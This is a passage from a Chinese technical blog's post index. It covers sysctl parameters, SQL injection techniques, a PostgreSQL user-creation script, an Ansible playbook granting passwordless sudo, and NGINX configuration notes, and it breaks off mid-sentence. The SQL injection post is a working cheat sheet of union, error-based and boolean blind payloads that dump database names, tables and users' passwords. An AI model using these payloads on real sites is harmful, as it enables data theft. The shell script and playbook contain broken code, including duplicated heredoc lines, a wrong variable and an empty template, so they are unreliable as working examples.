0\n#这个参数是运行一些事件中指定的io_setup系统调用当前所有活动的AIO。如果aio-nr的达到aio-max-nr,这时io-setup将失败。Aio-nr显示当前整个系统AIO请求数。Aiomax-nr允许你改变最大值好能让aio-nr能增加。\n\nfs.lease-break-time = 45\n#此文件规定内核在宽限期内准许租给一个私有的进程,在它发出信号后,那个处理通告发给另一个正在等待的开启档案,如果租约的文件在规定的时间里没有删除或者降级租凭,内核将强制中断合约。\n\nfs.dir-notify-enable = 1\n#该文件可用于禁止或启用dnotify接口中所描述fcntl(2)根据整个系统范围。此值为0禁用此文件中的接口,值为1时启用此接口。\n\nfs.leases-enable = 1\n#这个文件可以在整个系统里启动或禁用文件租约。如果这个值是0,租约停用,一个非零的值允许租约。\n\nfs.overflowgid = 65534 fs.overflowuid = 65534\n#这两个文件分别保存那些支持16位用户标识和组标识的任何文件系统的标识(UID)和组标识(GID)。可以更改这些值。但是如果您确实觉得需要这样做,那么您可能会发现更改组和密码文件项更容易些。缺省值为65534。\n\nfs.dentry-state = 61453 55221 45 0 0 0\n#现况的目录缓存。由于目录项是动态分配和释放。此文件表明目前的状况。他有6个值,最后两个值在不使用时总是0。\n\nfs.file-max = 779703\n#该文件指定了可以分配的文件句柄的最大数目。默认值为4096\n\nfs.file-nr = 3930 0 779703\n#该文件与file-max相关,它有三个值:已分配文件句柄的数目,已使用文件句柄的数目,文件句柄的最大数目,该文件是只读的,仅用于显示信息。\n\nfs.inode-state = 80826 27574 0 0 0 0 0\n#任何以名称“inode”开头的文件所执行的操作与上面那些以名称“file”开头的文件所执行的操作一样,但所执行的操作与索引节点有关,而与文件句柄无关。\n\nfs.inode-nr = 8082  6 27574\n#该文件与file-max相关,它有三个值:已分配文件句柄的数目。已使用文件句柄的数目。文件句柄的最大数目。\n\nfs.binfmt_misc.status = enabledf\n#binfmt_misc的注册文件系统状态,默认enablef。\n```\n\n**该文章转发自 ：[Sysctl.conf中文指南](https://cn.aliyun.com/jiaocheng/162164.html)**\n**本文内容转发至阿里云-Sysctl.conf中文参数指南，本网站不拥有所有权，如有侵权请联系博主查实！**","tags":["Linux内核"],"categories":["Linux内核"]},{"title":"SQL注入之常见注入手段","url":"/posts/20aeac77/","content":"\n### 0x01 联合查询注入\n\n>使用情景：页面有显示位。\n优点：语句简单，快速。\n缺点：条件苛刻。\n原理：通过显示位，直接爆出所查信息。\n\n```\n1.判断当前数据表中有几列:\n?id=1' order by 数值 --+\n2.查看显示位在第几列(这里假设共有3列)：\n?id=-1' union select 1,2,3 --+\n3.显示当前数据库(假设显示位在第3 列)：\n?id=-1' union select 1,2,database() --+\n4.查询当前数据库的所有表：\n?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+\n5.查询所有数据库 ：\n?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata) --+\n6.查询某个数据库中的表 (此例为 db1 数据库)：\n?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='message') --+\n7.查询某个表中的所有字段 (此例为 message数据库中的users 表)：\n?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema='message' and table_name='users') --+\n8.查询某个表中的字段内容(此例为 message数据库中的users 表)：\n?id=-1' union select 1,2,(select group_concat(name,0x3a,0x3a,passwd) from message.users) --+\n```\n<!-- more -->\n### 0x02 报错型注入\n\n>使用情景：服务器开着，有mysql_error()的报错信息，但是没有显示位。\n优点：没显示位也可用，快速。\n缺点：语句复杂。\n原理：根据详细的报错信息。可以查看到数据库中的所有内容。\n\n```\nfloor 类型\n固定格式：(星号位置替换为查询语句即可)\n?id=1' and (select 1 from (select count(),concat(0x3a,0x3a,(*******),0x3a,0x3a, floor(rand(0)2)) a from information_schema.columns group by a)s) --+\n1.爆数据库：\n?id=1' and (select 1 from (select count(),concat(0x3a,0x3a,(\nselect distinct table_schema from information_schema.columns limit 1,1\n),0x3a,0x3a, floor(rand(0)2)) a from information_schema.columns group by a)s) --+\n小提示：由于报错信息每次只能显示1行，所以此处使用limit，通过修改limit后的第一个数值，可依次爆出所有内容。下同。\n2.爆表名（此例为message数据库）：\n?id=1' and (select 1 from (select count(),concat(0x3a,0x3a,(\nselect table_name from information_schema.tables where table_schema='message' limit 2,1\n),0x3a,0x3a, floor(rand(0)2)) a from information_schema.columns group by a)s) --+\n3.爆字段（此例为message数据库的users表）：\n?id=1' and (select 1 from (select count(),concat(0x3a,0x3a,(\nselect column_name from information_schema.columns where table_schema='message' and table_name='users' limit 2,1\n),0x3a,0x3a, floor(rand(0)2)) a from information_schema.columns group by a)s) --+\n4.爆内容（此例为message数据库的users表）：\n?id=1' and (select 1 from (select count(),concat(0x3a,0x3a,(\nselect concat(0x3a,0x3a, name,0x3a,0x3a,passwd,0x3a,0x3a) from message.users limit 0,1\n),0x3a,0x3a, floor(rand(0)2)) a from information_schema.columns group by a)s) --+\n```\n\n### 0x03 布尔类型注入sql盲注\n\n>优点：通用性强，可以没有显示位，可以没有报错信息。\n缺点：慢。\n原理：根据返回页面是否正常，判断值的范围，通过二分法最终确定具体的值。 \n\n```\n使用到的函数：\nexists() 查询至少返回一条数据\n返回：true or false\nascii() 返回一个字符串最左边ascii码的值\nsubstr() 三个参数，一：字符串，二：开始位置，三：长度 mysql中开始位置从1开始。\nlength() 计算长度函数\n\npayload:\n1.查询所有数据库\n查询数据库个数:\n?id=1' and ((select count(schema_name) from information_schema.schemata) < 77)--+\n77为随意输入数字，可通过二分法确定最终值。下同。\n查询某一个数据库的长度：\n?id=1' and ((select length(schema_name) from information_schema.schemata limit 1,1) < 77)--+\n3)查看某个数据库名：\n?id=1' and ((select ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))) < 77)--+\n通过改变limit与substr的值，依次查看每一个字符\n\n2.查询某个数据库的所有表\n1)查询表的个数 (此例为message数据库中的表)：\n?id=1' and ((select count(distinct+table_name) from information_schema.tables where table_schema='message' ) < 77)--+\n2)查看某个表名的长度(此例为message数据库中的表):\n?id=1' and ((select length(table_name) from information_schema.tables where table_schema='message' limit 1,1) < 77)--+\n3)查看某个表名(此例为message数据库中的表):\n?id=1' and ((select ascii(substr((select table_name from information_schema.tables where table_schema='message' limit 1,1),1,1))) < 77)--+\n通过改变limit与substr的值，依次查看每一个字符\n\n3.查询某个表中的所有字段\n1)表中字段的个数（此例中为message数据库中的users表）:\n?id=1' and ((select count(distinct+column_name) from information_schema.columns where table_schema='message' and table_name='users' ) < 77)--+\n2)查看某个字段名的长度（此例中为message数据库中的users表）:\n?id=1' and ((select length(column_name) from information_schema.columns where table_schema='message' and table_name='users' limit 1,1) < 77)--+\n3)查看某个字段名（此例中为message数据库中的users表）:\n?id=1 ' and ((select ascii(substr((select column_name from information_schema.columns where table_schema='message' and table_name='users' limit 1,1),1,1))) < 77)--+\n通过改变limit与substr的值，依次查看每一个字符\n\n4.查看内容\n1)查看表中的行数（此例中为message数据库中的users表）:\n?id=1' and ((select count(*) from message.users ) < 77)--+\n2)查看某个字段对应内容的长度（此例中为message数据库中的users表）：\n?id=1' and ((select length(name) from message.users limit 1,1) < 77)--+\n3)查看某个字段名对应内容（此例中为message数据库中的users表中的name字段）：\n?id=1' and ((select ascii(substr((select name from message.users limit 1,1),1,1))) < 77)--+\n通过改变limit与substr的值，依次查看每一个字符\n```","tags":["SQL注入"],"categories":["SQL注入"]},{"title":"Shell脚本创建PostgreSQL用户及数据库","url":"/posts/e4194eb6/","content":"\nPostgreSQL官方文档 [PostgreSQL-10](https://www.postgresql.org/docs/10/index.html)\nPostgreSQL中文手册 [PostgreSQL-10](http://www.postgres.cn/docs/10/)\nPostgreSQL常见问题手册[FAQ](http://www.postgres.cn/v2/document/faq)\n\n---\n\n## [Shell]创建PostgreSQL用户及数据库\n\n### Shell脚本内容\n**请注意：（以下脚本存在一些变量，请根据实际情况使用或修改）**\n\n``` \n#!/bin/bash\n# Create a Database Script by PostgreSQL.\n\nDB_HOST=\"postgresql.com\"\nADMIN_USER=\"postgres\"\nADMIN_PASS=\"17s1x02kk^s\"\nADMIN_DB=\"postgres\"\n\nDEST_USER=\"test_user\"\nDEST_PASS=\"98kav1xz452@\"\nDEST_DATABASE=\"test_db\"\n\npsql -U $ADMIN_USER -W $ADMIN_PASS -h $DB_HOST -d $ADMIN_DATABASE << EOF 2>/dev/null\nexport PGPASSWORD=$ADMIN_PASS\npsql -U $ADMIN_USER -h $DB_HOST -d $ADMIN_DB << EOF\nCREATE USER ${DEST_USER} WITH PASSWORD '${DEST_PASS}';\nCREATE DATABASE $DEST_DATABASE;\nGRANT ALL PRIVILEGES ON DATABASE $DEST_DATABASE TO ${DEST_USER};\nALTER SCHEMA public OWNER to ${DEST_USER};\nalter database $DEST_DATABASE set timezone='PRC';\nEOF\n```\n<!-- more -->\n### 脚本详情讲解\n**请注意：（该脚本每次执行都需要修改创建的用户及密码数据库等信息，你可以通过输入赋值到变量进行创建操作）**\n```\n#!/bin/bash\n# Create a Database Script by PostgreSQL.\n\nDB_HOST=\"postgresql.com\"  #远程数据库地址\nADMIN_USER=\"postgres\"  #管理用户\nADMIN_PASS=\"17s1x02kk^s\"  #管理用户密码\nADMIN_DB=\"postgres\"  #管理数用户据库\n\nDEST_USER=\"test_user\"  #需要创建的用户名\nDEST_PASS=\"98kav1xz452@\"  #创建用户名密码\nDEST_DATABASE=\"test_db\"  #创建数据库\n\npsql -U $ADMIN_USER -W $ADMIN_PASS -h $DB_HOST -d $ADMIN_DATABASE << EOF 2>/dev/null\nexport PGPASSWORD=$ADMIN_PASS\npsql -U $ADMIN_USER -h $DB_HOST -d $ADMIN_DB << EOF\nCREATE USER ${DEST_USER} WITH PASSWORD '${DEST_PASS}';\nCREATE DATABASE $DEST_DATABASE;\nGRANT ALL PRIVILEGES ON DATABASE $DEST_DATABASE TO ${DEST_USER};\nALTER SCHEMA public OWNER to ${DEST_USER};\nalter database $DEST_DATABASE set timezone='PRC';\nEOF\n```\n\nMore Info: [PostgreSQL](https://www.postgres.cn/)\n","tags":["数据库","Shell"],"categories":["Shell","数据库"]},{"title":"Ansible自动化之批量创建用户","url":"/posts/b079133c/","content":"\n## [Ansible自动化]之批量创建用户\n\n---\n\nAnsible中文权威指南 [Ansible](http://www.ansible.com.cn/index.html)\nAnsible-Playbooks中文指南 [Ansible-Playbooks](http://www.ansible.com.cn/docs/playbooks.html)\n\n------\n\n### 剧本正文\n**请注意：（以下剧本存在一些变量，请根据实际情况使用或修改，请根据YML格式进行修改）**\n<!-- more -->\n``` \n---\n- name: Initialize the security of Changan Linux system\n  hosts: \"{{ hosts }}\"\n  remote_user: \"{{ user }}\"\n  sudo: yes\n  vars:\n      user1: user1\n      user2: user2\n  tasks:\n \n    - name: Create user {{ user1 }}\n      user:\n        name: \"{{ user1 }}\"\n        shell: /bin/bash\n        createhome: yes\n        home: /home/{{ user1 }}\n        state: present\n \n    - name: Create user {{ user2 }}\n      user:\n        name: \"{{ user2 }}\"\n        shell: /bin/bash\n        createhome: yes\n        home: /home/{{  }}\n        state: present\n \n \n    - name: Set authorized key taken {{ user1 }}\n      authorized_key:\n        user: \"{{ user1 }}\"\n        state: present\n        key: \"{{ lookup('file', '/etc/ansible/keys/ssh/user1_id_rsa.pub') }}\"\n\n    - name: Set authorized key taken {{ user2 }}\n      authorized_key:\n        user: \"{{ user2 }}\"\n        state: present\n        key: \"{{ lookup('file', '/etc/ansible/keys/ssh/user2_id_rsa.pub') }}\"\n\n\n\n    - name: Allow {{ user1 }} to have passwordless sudo\n      lineinfile:\n        dest: /etc/sudoers\n        state: present\n        line: \"{{ user1 }}  ALL=(ALL)  NOPASSWD: ALL\"\n \n    - name: Allow {{ user2 }} to have passwordless sudo\n      lineinfile:\n        dest: /etc/sudoers\n        state: present\n        line: \"{{ user2 }}  ALL=(ALL)  NOPASSWD: ALL\"\n\n```\n\n### 剧本详情讲解\n\n```\n---\n- name: Initialize the security of Changan Linux system\n  hosts: \"{{ hosts }}\"  #执行任务的目标主机\n  remote_user: \"{{ user }}\"  #在目标主机上执行任务的用户\n  sudo: yes  #使用sudo执行命令\n  vars:  #剧本定义变量\n      user1: user1\n      user2: user2\n  tasks:  #任务列表\n \n    - name: Create user {{ user1 }}  #创建用户\n      user:\n        name: \"{{ user1 }}\"  #用户名\n        shell: /bin/bash  #系统环境\n        createhome: yes  #是否创建home下目录\n        home: /home/{{ user1 }}  #宿主目录\n        state: present\n \n    - name: Create user {{ user2 }}\n      user:\n        name: \"{{ user2 }}\"\n        shell: /bin/bash\n        createhome: yes\n        home: /home/{{  }}\n        state: present\n \n \n    - name: Set authorized key taken {{ user1 }}  #传输SSH公钥（用于SSH秘钥连接）\n      authorized_key:\n        user: \"{{ user1 }}\"  #用户名\n        state: present\n        key: \"{{ lookup('file', '/etc/ansible/keys/ssh/user1_id_rsa.pub') }}\"  #公钥地址\n\n    - name: Set authorized key taken {{ user2 }}\n      authorized_key:\n        user: \"{{ user2 }}\"\n        state: present\n        key: \"{{ lookup('file', '/etc/ansible/keys/ssh/user2_id_rsa.pub') }}\"\n\n\n\n    - name: Allow {{ user1 }} to have passwordless sudo  #赋予sudo权限\n      lineinfile:\n        dest: /etc/sudoers\n        state: present\n        line: \"{{ user1 }}  ALL=(ALL)  NOPASSWD: ALL\"  #赋予所以权限，使用sudo不需要密码\n \n    - name: Allow {{ user2 }} to have passwordless sudo\n      lineinfile:\n        dest: /etc/sudoers\n        state: present\n        line: \"{{ user2 }}  ALL=(ALL)  NOPASSWD: ALL\"\n```\n\nMore Info: [Ansible](https://www.ansible.com)\n","tags":["Ansible"],"categories":["Ansible"]},{"title":"NGINX配置文件配置信息","url":"/posts/754220bd/","content":"NGINX配置文件官方示例 [NGINX](https://www.nginx.com/resources/wiki/start/topics/examples/full/)\nNGINX官方文档 [NGINX](https://www.nginx.com/en/docs/)\n\n---\n\n## NGINX配置文件配置信息\n\n### 详细内容\n**请注意：（上面内容为简化版，下面内容是详细配置信息，有些是上面没有的，如果你需要可以手动添加）**\n<!-- more -->\n``` \n#   * For more information on configuration, see:\n#   * Official English Documentation: http://nginx.org/en/docs/\n#   * Official Russian Documentation: http://nginx.org/ru/docs/\n\nuser nginx;\nworker_processes auto;\nerror_log /var/log/nginx/error.log;\npid /var/run/nginx.pid;\n\n# Load dynamic modules. See /usr/share/nginx/README.dynamic.\ninclude /usr/share/nginx/modules/*.conf;\n\nworker_rlimit_nofile 65535;\n\nevents {\n    use epoll;\n    multi_accept on;\n    worker_connections 65480;\n}\n\nhttp {\n    log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n                      '$status $body_bytes_sent \"$http_referer\" '\n                      '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    access_log  /var/log/nginx/access.log  main;\n\n    server_tokens\toff;\n    sendfile            on;\n    tcp_nopush          on;\n    tcp_nodelay         on;\n    keepalive_timeout   65;\n    types_hash_max_size 2048;\n\n    limit_req_zone $binary_remote_addr zone=addr:10m rate=50r/s;\n    #limit_conn addr 100;\n    gzip  on;\n    gzip_disable “MSIE [1-6].(?!.*SV1)”;\n    gzip_http_version 1.1;\n    gzip_vary on;\n    gzip_proxied any;\n    gzip_min_length 1k;\n    gzip_buffers 4 16k;\n    gzip_comp_level 6;\n    gzip_types text/plain text/css text/xml text/javascript application/json application/x-javascript application/xml application/xml+rss application/javascript;\n\n    include             /etc/nginx/mime.types;\n    default_type        application/octet-stream;\n\n    # Load modular configuration files from the /etc/nginx/conf.d directory.\n    # See http://nginx.org/en/docs/ngx_core_module.html#include\n    # for more information.\n    include /etc/nginx/conf.d/*.conf;\n}\n\n```\n\n\n\n### 主配置配置文件讲解\n\n``` \n#   * For more information on configuration, see:\n#   * Official English Documentation: http://nginx.org/en/docs/\n#   * Official Russian Documentation: http://nginx.org/ru/docs/\n\nuser nginx;  #定义NGINX运行用户\nworker_processes auto;  #启动进程，通常设置为和CPU数量相等或auto为自动\nworker_cpu_affinity 0001 0010 0100 1000; #为每个进程分配CPU，例子中将8个进程分配到8个CPU，当然可以写多个，或者将一个进程分配到多个CPU\nerror_log /var/log/nginx/error.log; #全局错误日志，日志定义等级{debug|info|notice|warn|error|crit}\npid /var/run/nginx.pid;  #PID文件\n\n# Load dynamic modules. See /usr/share/nginx/README.dynamic.\ninclude /usr/share/nginx/modules/*.conf;\n\nworker_rlimit_nofile 65535;  #NGINX进程打开最多文件描述符数目，理论值应该是最多打开文件数(ulimit -n)与NGINX进程数相处，但是NGINX分配请求不是那么均匀，所以最好与(ulimit -n)的值保持一致\n\n#工作模式及连接上限\nevents {\n    use epoll; #异步读写模型，是多路复用I/O中的一种方式，仅用于Linux2.6以上内核，可以大大提高NGINX的性能\n    multi_accept on; #告诉NGINX尽可能的接受更多请求\n    worker_connections 65480;  #单个后台Worker process进程的最大并发连接数（最大连接数=连接数*进程数）\n}\n\n#设定HTTP服务器，利用它的反向代理功能提供负载均衡支持\nhttp {\n    log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n                      '$status $body_bytes_sent \"$http_referer\" '\n                      '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    access_log  /var/log/nginx/access.log  main;  #设定日志格式\n\n    server_tokens\toff;  #隐藏返回NGINX版本信息\n\tautoindex          off;  #开启目录列表访问，适合下载服务器，默认关闭\n    sendfile            on;  #sendfile指令指定Nginx是否调用sendfile函数（zero copy方式）来输出文件，对于普通应用必须设定为on，如果用来进行下载等应用磁盘I/O重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的uptime\n\n    tcp_nopush          on;  #防止网络阻塞\n    tcp_nodelay         on;  #提高数据的实时响应性\n    keepalive_timeout   65;  #keepalive超时时间，客户端到服务器端的连接持续有效时间，当出现对服务器的后继请求时，keepalive-timeout功能可以避免建立或重新建立连接\n    types_hash_max_size 2048;\n\n    #以\"$binary_remote_addr\"为辨识获取钥匙，定义addr为限值域，10m为钥匙桶大小（10兆），50r/s为1次每秒\n    limit_req_zone $binary_remote_addr zone=addr:10m rate=50r/s;\n    #limit_conn addr 100;\n    gzip  on;  #开启gzip压缩\n    gzip_disable “MSIE [1-6].(?!.*SV1)”;  #关闭微软IE浏览器GZIP压缩，因为IE6对GZIP不友好\n    gzip_http_version 1.1;  #压缩版本\n    gzip_vary on;  #启用答应头\"Vary: Accept-Encoding\"\n    gzip_proxied any;  #NGINX作为反向代理时启用，off(关闭所有代理结果的数据的压缩),expired(启用压缩,如果header头中包括\"Expires\"头信息),no-cache(启用压缩,header头中包含\"Cache-Control:no-cache\"),no-store(启用压缩,header头中包含\"Cache-Control:no-store\"),private(启用压缩,header头中包含\"Cache-Control:private\"),no_last_modefied(启用压缩,header头中不包含\"Last-Modified\"),no_etag(启用压缩,如果header头中不包含\"Etag\"头信息),auth(启用压缩,如果header头中包含\"Authorization\"头信息)\n    gzip_min_length 1k;  #最小压缩\n    gzip_buffers 4 16k;  #以16k为单位，按照原始数据大小以16k为单位的4倍申请内存\n    gzip_comp_level 6;  #压缩级别大小，最大为9，值越小，压缩比例越小，CPU处理更快，值越大，消耗CPU越高\n    gzip_types text/plain text/css text/xml text/javascript application/json application/x-javascript application/xml application/xml+rss application/javascript;  #匹配压缩类型\n    \n    client_max_body_size 10MB;  #允许客户请求的最大单文件字节数\n    client_body_buffer_size 128KB;  #缓冲区代理缓存用户端请求的最大字节数\n    proxy_connect_timeout 90;  #NGINX跟后端服务器连接超时时间（代理连接超时）\n    proxy_send_timeout 90;  #后端服务器数据回传时间（代理发送超时）\n    proxy_read_timeout 90;  #连接成功后，后端服务器响应时间（代理接收超时）\n    proxy_buffer_size 4KB;  #设置代理服务器（NGINX）保存用户头信息的缓冲区大小\n    proxy_buffers 4 32KB;  #proxy_buffers缓冲区，页面平均在32KB以下的话，这样设置\n    proxy_busy_buffers_size 64KB;  #高负荷下缓存大小（proxy_buffers*2）\n    large_client_header_buffers 4 4KB;  #设定请求缓存\n    client_header_buffer_size 4KB;  #客户端请求头部的缓冲区大小，这个可以根据系统分页大小来设置，一般一个请求的头部大小不会超过1KB，不过由于一般系统分页都要大于1KB，所以这里设置为分页大小，分页大小可以用命令getconf PAGESIZE取得\n    open_file_cach_max =1024 inactive=20s;  #这个将为打开文件指定缓存，默认是没有启用的，max指定缓存数量，建议和打开文件数一致，inactive是指经过多长时间文件没被请求后删除缓存\n    open_file_cache_valid 30s;  #这个是指多长时间检查一次缓存的有效信息\n    open_file_cache_min_user 1;  #open_file_cache指令中的inactive参数时间的最少使用次数，如果超过这个次数，文件描述符一直是在缓存中打开的， 如下例，如果有一个文件在inactive\n    types_hash_max_size 2048;  #types_hash_max_size 影响散列表的冲突率。types_hash_max_size越大，就会消耗更多的内存，但散列key的冲突率会降低，检索速度就更快。types_hash_max_size越小，消耗的内存就越小，但散列key的冲突率可能上升\n    \n\n    include             /etc/nginx/mime.types;  #设置MIME类型，类型由mime.type文件定义\n    default_type        application/octet-stream;  #避免浏览器自动播放文件，这个类型会让浏览器认为响应是普通的文件流，并提示用户下载文件\n\n    # Load modular configuration files from the /etc/nginx/conf.d directory.\n    # See http://nginx.org/en/docs/ngx_core_module.html#include\n    # for more information.\n    include /etc/nginx/conf.d/*.conf;  #包含其他配置文件，如自定义的虚拟主机\n}\n\n```\n\n### NGINX均衡负载及虚拟主机配置文件讲解\n\n``` \n#以下为NGINX应用分布式负载均衡群及配置，NGINX实现负载均衡需要基于ypstream模块，同时需要设置location proxy_pass转发指令实现，根据后端实际情况修改即可，beytagh_www为负载均衡模块的名称，可以任意指定，但是必须跟vhost.conf、nginx.conf虚拟主机的proxy_pass段保持一致，否则不能将请求转发至后端的服务器，weight表示配置权重，在fail_timeout内检查max_fails次数，失败则剔除均衡，配置如下：\nupstream beytagh_www {\n\tserver 127.0.0.1:8080 weight=1 max_fails=2 fail_timeout=30s;\n\tserver 127.0.0.1:8081 weight=1 max_fails=2 fail_timeout=30s;\n}\n#虚拟主机配置\nserver {\n  listen       80;  #侦听端口\n  server_name  www.gov-cn.cn;  #定义使用www.gov-cn.cn访问\n  access_log logs/access.log main;  #设定本虚拟主机的访问日志\n  root /data/webapps/www;  #定义服务器的默认网站根目录位置\n  index index.php index.html index.htm;  #定义首页索引文件的名称\n\nlocation ~/ {\n\troot /data/webapps/www;  #定义服务器的默认网站根目录位置\n\tindex index.php index.html index.htm;  #定义首页索引文件的名称\n\t#以下是一些反向代理的配置\n\tproxy_next_upstream http_502 http_504 error timeout invalid_header;  #如果后端服务器返回502、504、执行超市等错误，自动将请求转发到upstream负载均衡池中的另一台服务器，实现故障转移\n\tproxy_redirect off;  #后端的web服务器可以通过X-Forwarded-For获取用户的真实IP\n\tproxy_set_header Host $host;\n\tproxy_set_header X-Real-IP $remote_addr;\n\tproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n\tproxy_pass http:/beytagh_www;\n}\n#定义错误提示页面\nerror_page 500 502 503 504 /50x.html；\nlocation = /50x.html {\n\troot html;\n}\n#配置NGINX动静分离，定义的静态页面直接从NGINX发布目录读取\nlocation ~.*\\.(html|htm|gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ {\n\troot /data/webapps/www;\n\texpires 3d;  #expires定义用户浏览器缓存的时间为3天，如果静态页面不常更新，可以设置更长，这样可以节省带宽和缓解服务器的压力，在浏览器保存该类型文件的天数\n}\n#PHP脚本请求全部转发到FastCGI处理，使用FastCGI默认配置\nlocation ~\\.php$ {\n\troot /data/webapps/www;\n\tFastCGI_pass 127.0.0.1:9000;\n\tFastCGI_index index.php;\n\tFastCGI_param SCRIPT_FILENAME /data/webapps/www$FastCGI_script_name;  #如果server段没有配置主目录则使用这行代码\n\tfastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;  #如果server段设置了主目录则可以使用代码\n\tinclude        fastcgi_params;\n}\n#定义查看NGINX状态的地址\nlocation /NginxStatus {\n\tstub_status on;\n}\n}\n#注：通过expires参数设置，可以在浏览器缓存静态文件，从而减少用户与服务器之间的请求和流量，具体expires定义是给一个资源设定一个过期时间，浏览器无需去服务端下载资源，直接通过浏览器自身确认是否过期即可，所以不会产生额外的流量。\n#如果静态文件不常更新，expires可以设定为30d，表示在这30天内再次访问该静态文件，浏览器会发送一个http请求，会对比服务器该文件最后更新时间是否有变化，如果没有变化，则不会从服务器抓取，返回HTTP状态码304，如果有修改，则直接从服务器重新下载，返回状态码200\n``` \n\n### NGINX实用规则\n\n``` \n1.概述\n大家都知道NGINX有很多功能模块，比如反向代理、缓存等，这篇总结了下我们这些年实际环境中那些有用的NGINX规则和模块，大部分适用法的概括和介绍，具体细节在实际配置时再自行Goole吧。\n\n2.内置语法\n先介绍NGINX默认已支持的内置功能，靠这些基本就能满足大部分的web服务需求。\n\n2.1 proxy代理\nproxy常用于两类应用场景，一类是中转，如异地科学的上网方式，另外一类是到后端服务的负载均衡方案。\n用反向代理时候，需要特别注意里面的域名默认是在NGINX启动时候就解析了，除非reload否则一直用的是当初解析的域名，也就是说不能动态解析，但这个问题是可以通过别的模块或者用内置字典变量方式来解决。\nresolver 114.114.114.114;\nserver {\n    location / {\n        set $servers github.com;\n        proxy_pass http://$servers;\n    }\n}\n\n2.1.1 中转\n针对某个域名进行中转：\nserver {\nlisten 172.16.10.1:80;\n    server_name pypi.python.org;\n    location ~ /simple {\n        proxy_set_header Host $http_host;\n        proxy_redirect off;\n        proxy_pass http://pypi.python.org;\n    }\n}\n注意如果是前后端域名不一样的话需要处理proxy_redirect的301跳转之类的显示，否则在跳转时候会跳转到proxy_pass的域名。\n另外可以直接代理所有80端口的http流量：\nserver {\n    listen 80;\n    server_name _;\n    resolver 114.114.114.114;\n    set $URL $host;\n    location / {\n        proxy_pass http://$URL;\n    }\n}\n如果是想代理https的站点也不是不可能，只是需要自行处理CA证书导入即可，而且经过https中转的流量对nginx是透明的，也就是有证书的时候做窃听和劫持的情况。\n\n2.1.2 负载均衡\n这是代理的另外一个常见用法，通过upstream到多个后端，可以通过weight来调节权重或者backup关键词来指定备份用的后端，通常默认就可以 了，或者可以指定类似ip_hash这样的方式来均衡，配置很简单，先在http区域添加upstream定义：\nupstream backend {\n    ip_hash;\n    server backend1.example.com weight=5;\n    server backend2.example.com weight=5;;\n}\n然后在server里面添加proxy_pass：\nlocation / {\n    proxy_pass http://backend;\n    proxy_http_version 1.1;\n    proxy_set_header Connection \"\";\n}\n做负载均衡的时候可以智能识别后端服务器状态，虽然可以智能地proxy_next_upstream到另外的后端，但还是会定期损失一些正常的“尝试性”的连接，比如过了max_fails 次尝试之后，休息fail_timeout时间，过了这个时间之后又会去尝试，这个时候可以使用第三方的upstream_check模块来在后台定期地自动探索，类似这样：\ncheck interval=3000 rise=2 fall=5 timeout=2000 type=http;\n这样替代用户正常的连接来进行尝试的方式进一步保障了高可用的特性。\n还有就是在做前端代理的时候也是这样的方式，直接proxy_pass到后端即可，比如CDN的场景。\n\n2.2 防盗链\n普通的防盗链是通过referer来做，比如：\nlocation ~* \\.(gif|jpg|png|bmp)$ {\n    valid_referers none blocked *.example.com server_names ~\\.google\\. ~\\.baidu\\.;\n    if ($invalid_referer) {\n        return 403;\n    }\n}\n再精细一点的就是URL加密，针对一些用户IP之类的变量生成一个加密URL通常是针对文件下载时候用到，可以通过openresty来写lua脚本或者是accesskey之类的模块来实现。\n\n2.3 变量\nNGINX里面支持正则匹配和变量配置，默认的变量比如remote_addr、request_filename、query_string、server_name之类的，这些组合在一起可以做很多规则，或者还有日志里面status、http_cookie等。\n还有在进行多域名配置时候可以用通配符，比如：\nserver_name ~^(www\\.)?(.+)$;\nroot /data/web/$2;\n这样就实现了自动进行域名的目录指派。\n变量方面，比如配置变量a=1：\nset $a 1;\n下面这个案例配合if判断来做有更大的用处。\n\n2.4 if判断\nnginx里面支持一些简单的if判断，但是没有多重逻辑的语法，多个判断条件用起来需要结合变量的方式来实现，比如允许ip地址为10.10.61段和和192.168.100段的用户访问，其余的拒绝，返回405状态码：\nset $err 0;\n    if ( $remote_addr ~ 10.10.61.){\n        set $err 0;\n    }\n    if ( $remote_addr ~ 192.168.100.){\n        set $err 0;\n    }\n    if ( $err = 1){\n        return 405;\n    }\n这样通过一个err变量比较巧妙实现了需求。\n\n2.5 error_page\n有用到后端proxy的地方需要加上这句话才可以传到状态码到NGINX：\nfastcgi_intercept_errors on;\n具体配置一般是配置到具体的错误URL页面，比如：\n#返回具体状态码\nerror_page 404 403 /4xx.html\n#返回200状态码\nerror_page 404 403 =200  /error.html\n或者采用callback的方式统一做处理：\nerror_page 404 403 = @fallback; \nlocation @fallback {\n    proxy_pass http://backend;\n    access_log /data/logs/404_error.log access;\n}\n这样在重定向时不会改变URL，然后把404页面直接返回。\n\n2.6 rewrite\nrewrite做一些301、302之类的跳转，同时也可以在CDN前端做“去问号”缓存的效果。\nlocation /db.txt {\n    rewrite (.*) $1? break;\n    include proxy.conf;\n}\n另外最常见的跳转写法：\nrewrite ^/game/(.*) /$1;\n把/game/test跳转为/test的效果，注意这样是没有状态码的，如果访问正常就直接返回200状态码。\n可以在后面加个permanent参数，就变为了301 Moved Permanently，或者添加redirect改为302跳转。\n同理，还可以进行多个正则匹配进行URL重组，比如：\nrewrite ^/download/(.*)/lastest/(.*)$ /file/$1?ver=$2 break;\n\n2.7 日志字段\n想针对每个连接进行日志留档，可以在NGINX日志那里配置好字段，比如记录cookie之类的数据。\n在log_format字段里面加入$http_cookie变量即可。\n另外post的数据可以永久保留在文件里面，比如用来做http的日志备份，包括get和post的原始数据，把这个值开启即可：\nclient_body_in_file_only  on;\n然后post的数据就会保存在nginx/client_body_temp文件夹里面。\n\n2.8 internal 关键字\n这个关键词很少见，但有时候是很有用的，比如在有很多规则时候，突然需要针对某个目录转为NGINX内部处理。\nlocation 